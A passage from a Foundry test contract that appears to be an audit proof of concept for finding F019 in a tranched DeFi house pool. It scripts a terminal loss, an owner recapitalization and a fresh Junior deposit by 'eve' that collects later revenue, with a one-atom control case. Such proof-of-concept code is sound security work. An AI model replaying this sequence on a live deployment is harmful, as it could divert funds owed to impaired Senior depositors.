    /// Control: the same flow with one atom of LP equity left by the loss. Must PASS with and without the fix.
    function test_F019_control() public {
        Run memory twin = _scenario(true);
        assertEq(twin.seniorAfterLoss, 1, "control: loss left one atom of Senior");
        assertEq(twin.hwmAfterRecap, twin.hwmAfterLoss, "control: recap kept the HWM");
        assertEq(twin.seniorAfterRecap, 1 + twin.recap, "control: whole recap restored Senior");
        assertEq(twin.seniorAfterRevenue1, twin.seniorAfterRecap + twin.revenue1, "control: revenue restored Senior");
        assertEq(twin.juniorAfterRevenue1, 0, "control: Junior received nothing");
        assertFalse(twin.juniorOpenAfterRecap, "control: Junior stays closed while Senior is impaired");
        assertEq(twin.eveMaxRequest, 0, "control: no fresh Junior entry");
        _log(twin);
    }

    // ------------------------------------------------------------------ shared steps

    /// @dev `oneAtomLeft`: false = the claim (the terminal loss takes all LP equity at the mark), true = the twin
    ///      control (the loss leaves exactly one atom of LP equity). HousePool.settleLpEpoch() reverts without matured LP work,
    ///      so every settlement processes an ordinary LP request queued in the previous epoch.
    function _scenario(bool oneAtomLeft) internal returns (Run memory r) {
        // Step 1: a new Senior LP requests a 38.5M USDG deposit and two Junior LPs 10k each; the next LP epoch settles
        //         them (permissionless keeper). Senior is not impaired: HWM == principal.
        uint256 requestEpoch = _requestDeposit(senior, sam, SENIOR_DEPOSIT);
        _requestDeposit(junior, jill, JUNIOR_DEPOSIT);
        _requestDeposit(junior, joe, JUNIOR_DEPOSIT);
        _requestDeposit(junior, kim, JUNIOR_DEPOSIT);
        uint64 t = uint64(pool.lpEpochStart(requestEpoch)) + 30;
        _advance(t);
        _settle(t, BASE);
        vm.prank(sam);
        r.samShares = senior.deposit(SENIOR_DEPOSIT, sam);
        vm.prank(jill);
        junior.deposit(JUNIOR_DEPOSIT, jill);
        vm.prank(joe);
        junior.deposit(JUNIOR_DEPOSIT, joe);
        vm.prank(kim);
        junior.deposit(JUNIOR_DEPOSIT, kim);
        assertEq(pool.seniorHighWaterMark(), pool.seniorPrincipal(), "Senior not impaired before the loss");

        // Step 2: one epoch later the USD strengthens 1% against the basket; a mark refresh installs it, so the
        //         fork's open traders are in profit. Junior LP jill asks to exit.
        t = uint64(pool.lpEpochStart(requestEpoch + 1)) + 40;
        _advance(t);
        vm.prank(refresher);
        router.updateMarkPrice{value: pythFee}(_payload(t, USD_UP));
        _requestFullRedeem(jill);

        // Step 3: terminal loss event at the next epoch, modelled as USDG leaving the pool (USDG is out of scope and
        //         mockable; HousePool.totalAssets() counts the raw shortfall). Claim: the loss takes all LP equity at
        //         the mark. Control: it leaves one atom.
        t = uint64(pool.lpEpochStart(requestEpoch + 2)) + 30;
        _advance(t);
        vm.prank(refresher);
        router.updateMarkPrice{value: pythFee}(_payload(t, USD_UP));
        HousePoolEngineViewTypes.HousePoolInputSnapshot memory s = ICfdEngineProtocolLens(pool.ENGINE_PROTOCOL_LENS())
            .getHousePoolInputSnapshot(pool.markStalenessLimit());
        assertLt(s.terminalLpPriceDeltaAssets, 0, "traders in profit at the loss");
        r.lpEquityAtLoss =
            uint256(int256(s.physicalAssets) + s.terminalLpPriceDeltaAssets - int256(s.traderClaimBalanceAssets));
        r.hwmBeforeLoss = pool.seniorHighWaterMark();
        r.lossAssets = oneAtomLeft ? r.lpEquityAtLoss - 1 : r.lpEquityAtLoss;
        deal(USDG, POOL, IERC20(USDG).balanceOf(POOL) - r.lossAssets);

        // Step 4: the next LP settlement (permissionless, processes jill's request) absorbs the loss: Junior, then
        //         Senior. absorbLoss keeps the Senior HWM (HousePoolWaterfallAccountingLib.sol:161-184).
        t += 1;
        _advance(t);
        _settle(t, USD_UP);
        r.seniorAfterLoss = pool.seniorPrincipal();
        r.juniorAfterLoss = pool.juniorPrincipal();
        r.hwmAfterLoss = pool.seniorHighWaterMark();
        assertEq(r.juniorAfterLoss, 0, "loss wiped Junior principal");
        assertEq(r.seniorAfterLoss, oneAtomLeft ? 1 : 0, "loss wiped Senior principal");
        assertGe(r.hwmAfterLoss, r.hwmBeforeLoss, "loss kept the Senior HWM");

        // Step 5: the owner recapitalizes to the runbook target raw solvency E >= L (SECURITY.md:1509-1510; the
        //         CfdEngine.clearDegradedMode check), i.e. R = L - E. Junior LP joe asks to exit.
        t += 1;
        _advance(t);
        r.solvencyBeforeRecap = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        r.maxLiability = _maxLiability();
        assertLt(r.solvencyBeforeRecap, r.maxLiability, "raw solvency E < L after the loss");
        r.recap = r.maxLiability - r.solvencyBeforeRecap;
        assertLt(r.recap, r.hwmAfterLoss, "runbook recap is below the kept Senior HWM");
        deal(USDG, OWNER, r.recap);
        vm.startPrank(OWNER);
        IERC20(USDG).approve(ENGINE, r.recap);
        engine.recapitalizePool(r.recap);
        vm.stopPrank();
        _requestFullRedeem(joe);

        // Step 6: the next LP settlement (permissionless, processes joe's request) applies the recap.
        t = uint64(pool.lpEpochStart(requestEpoch + 3)) + 30;
        _advance(t);
        _settle(t, USD_UP);
        r.seniorAfterRecap = pool.seniorPrincipal();
        r.juniorAfterRecap = pool.juniorPrincipal();
        r.hwmAfterRecap = pool.seniorHighWaterMark();
        r.pendingRecapAfterRecap = pool.pendingRecapitalizationAssets();

        // Step 7: the 1% move reverses; a mark refresh installs it, so the traders give back their profit (LP
        //         revenue, booked at the next reconcile). Junior deposits are open only if projected S >= HWM
        //         (HousePoolTrancheGateLib.sol:36). eve requests a Junior deposit if she can.
        t += 60;
        _advance(t);
        vm.prank(refresher);
        router.updateMarkPrice{value: pythFee}(_payload(t, BASE));
        r.juniorOpenAfterRecap = pool.canAcceptTrancheDeposits(false);
        r.eveMaxRequest = junior.maxRequestDeposit(eve);
        bool eveEnters = r.eveMaxRequest >= EVE_DEPOSIT;
        uint256 entryEpoch;
        if (eveEnters) {
            entryEpoch = _requestDeposit(junior, eve, EVE_DEPOSIT);
        } else {
            // No fresh entry possible: the next LP work is Junior LP kim's exit request instead.
            entryEpoch = _requestFullRedeem(kim);
        }

        // Step 8: the next LP settlement books the revenue (reconcile first), then activates eve's deposit at the
        //         post-revenue Junior price.
        t = uint64(pool.lpEpochStart(entryEpoch)) + 30;
        _advance(t);
        _settle(t, BASE);
        r.seniorAfterRevenue1 = pool.seniorPrincipal();
        r.juniorAfterRevenue1 = pool.juniorPrincipal() - (eveEnters ? EVE_DEPOSIT : 0);
        r.hwmAfterRevenue1 = pool.seniorHighWaterMark();
        r.revenue1 = (r.seniorAfterRevenue1 + r.juniorAfterRevenue1) - (r.seniorAfterRecap + r.juniorAfterRecap);
        r.seniorSupply = senior.totalSupply();
        if (!eveEnters) {
            return r;
        }
        r.juniorSupplyAtEntry = junior.totalSupply();
        vm.prank(eve);
        r.eveShares = junior.deposit(EVE_DEPOSIT, eve);

        // Step 9: after the 1 h activation cooldown the USD weakens 1% below the stored price (the traders lose
        //         again: more LP revenue). eve asks to redeem the part of her shares that Junior funding can cover
        //         (free cash and the Senior covenant cap it, HousePool.getPendingTrancheState()).
        t = uint64(pool.lpEpochStart(entryEpoch + 1)) + 30;
        _advance(t);
        vm.prank(refresher);
        router.updateMarkPrice{value: pythFee}(_payload(t, USD_DOWN));
        uint256 maxJuniorWithdraw;
        (r.seniorAfterRevenue2, r.juniorAfterRevenue2,, maxJuniorWithdraw) = pool.getPendingTrancheState();
        r.revenue2 = (r.seniorAfterRevenue2 + r.juniorAfterRevenue2)
            - (r.seniorAfterRevenue1 + r.juniorAfterRevenue1 + EVE_DEPOSIT);
        uint256 eveValue = junior.convertToAssets(r.eveShares);
        uint256 target = maxJuniorWithdraw * 9 / 10;
        if (target > eveValue) target = eveValue;
        r.eveRedeemShares = r.eveShares * target / eveValue;
        assertGt(r.eveRedeemShares, 0, "eve can redeem part of her Junior shares");
        r.eveRedeemCost = EVE_DEPOSIT * r.eveRedeemShares / r.eveShares;
        vm.prank(eve);
        junior.requestRedeem(r.eveRedeemShares, eve, eve);

        // Step 10: the next LP settlement books the second revenue (reconcile first) and funds eve's redemption at the
        //          post-revenue price; eve claims the USDG.
        t = uint64(pool.lpEpochStart(entryEpoch + 2)) + 30;
        _advance(t);
        _settle(t, USD_DOWN);
        r.seniorAfterSettle2 = pool.seniorPrincipal();
        uint256 usdgBefore = IERC20(USDG).balanceOf(eve);
        uint256 claimable = junior.maxRedeem(eve);
        vm.prank(eve);
        junior.redeem(claimable, eve, eve);
        r.eveUsdgOut = IERC20(USDG).balanceOf(eve) - usdgBefore;
        r.eveRemainingValue = junior.convertToAssets(junior.balanceOf(eve));
    }

    function _requestDeposit(ITrancheVaultF019 vault, address lp, uint256 assets) internal returns (uint256 epoch) {
        deal(USDG, lp, assets);
        vm.startPrank(lp);
        IERC20(USDG).approve(address(vault), assets);
        epoch = vault.requestDeposit(assets, lp);
        vm.stopPrank();
    }

    function _requestFullRedeem(address lp) internal returns (uint256 epoch) {
        uint256 shares = junior.balanceOf(lp);
        vm.prank(lp);
        epoch = junior.requestRedeem(shares, lp, lp);
    }

    // ------------------------------------------------------------------ helpers

    function _log(Run memory r) internal pure {
        console.log("Senior HWM before the loss", r.hwmBeforeLoss);
        console.log("LP equity at the mark before the loss", r.lpEquityAtLoss);
        console.log("terminal loss (USDG leaving the pool)", r.lossAssets);
        console.log("after loss: Senior / Junior / HWM", r.seniorAfterLoss, r.juniorAfterLoss, r.hwmAfterLoss);
        console.log("raw solvency E / max liability L before recap", r.solvencyBeforeRecap, r.maxLiability);
        console.log("owner recap R = L - E", r.recap);
        console.log("after recap: Senior / Junior / HWM", r.seniorAfterRecap, r.juniorAfterRecap, r.hwmAfterRecap);
        console.log("after recap: recap still queued", r.pendingRecapAfterRecap);
        console.log("Junior deposits open after the recap / eve max request", r.juniorOpenAfterRecap, r.eveMaxRequest);
        console.log("LP revenue 1 (move reverses)", r.revenue1);
        console.log("after revenue 1: Senior / Junior / HWM", r.seniorAfterRevenue1, r.juniorAfterRevenue1, r.hwmAfterRevenue1);
        console.log("eve deposit / eve Junior shares", EVE_DEPOSIT, r.eveShares);
        console.log("Junior supply when eve entered", r.juniorSupplyAtEntry);
        console.log("LP revenue 2 (USD -1%)", r.revenue2);
        console.log("after revenue 2 (projected, before eve's exit): Senior / Junior", r.seniorAfterRevenue2, r.juniorAfterRevenue2);
        console.log("eve redeemed shares / their cost basis", r.eveRedeemShares, r.eveRedeemCost);
        console.log("eve USDG received / remaining share value", r.eveUsdgOut, r.eveRemainingValue);
        console.log("sam's Senior shares / Senior supply", r.samShares, r.seniorSupply);
    }

    function _settle(uint64 tick, uint256 basketBps) internal {
        vm.prank(keeper);
        router.settleLpEpoch{value: pythFee}(_payload(tick, basketBps));
    }

    function _maxLiability() internal view returns (uint256) {
        (uint256 longMax,,,) = engine.sides(0);
        (uint256 shortMax,,,) = engine.sides(1);
        return longMax > shortMax ? longMax : shortMax;
    }

    /// @dev Moves time and the L2 block. On an Arbitrum fork `block.number` is the L1 block, and forge serves the
    ///      ArbSys precompile (0x64, out of scope) as the fork's L2 block without following vm.roll. On chain
    ///      arbBlockNumber() advances every L2 block, so the PoC sets it to the rolled L2 height.
    function _advance(uint64 timestamp) internal {
        l2Height += 4 * (timestamp - vm.getBlockTimestamp()) + 1; // Arbitrum produces ~4 L2 blocks per second
        vm.warp(timestamp);
        vm.roll(l2Height);
        vm.mockCall(
            address(100), abi.encodeWithSelector(IArbSysBlockF019.arbBlockNumber.selector), abi.encode(l2Height)
        );
    }

    /// @dev Signed-update stand-in for a live tick at `tick`: the real stored price of each feed at FORK_BLOCK with the
    ///      basket scaled by `basketBps`/10_000: USD-quoted feeds x f, inverted (USD/xxx) feeds x 1/f.
    function _payload(uint64 tick, uint256 basketBps) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            int64 price = p.price;
            if (basketBps != BASE) {
                price = inverted[i]
                    ? int64(int256(price) * int256(BASE) / int256(basketBps))
                    : int64(int256(price) * int256(basketBps) / int256(BASE));
            }
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: price, conf: p.conf, expo: p.expo, publishTime: tick, prevPublishTime: tick - 1
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }
}
```
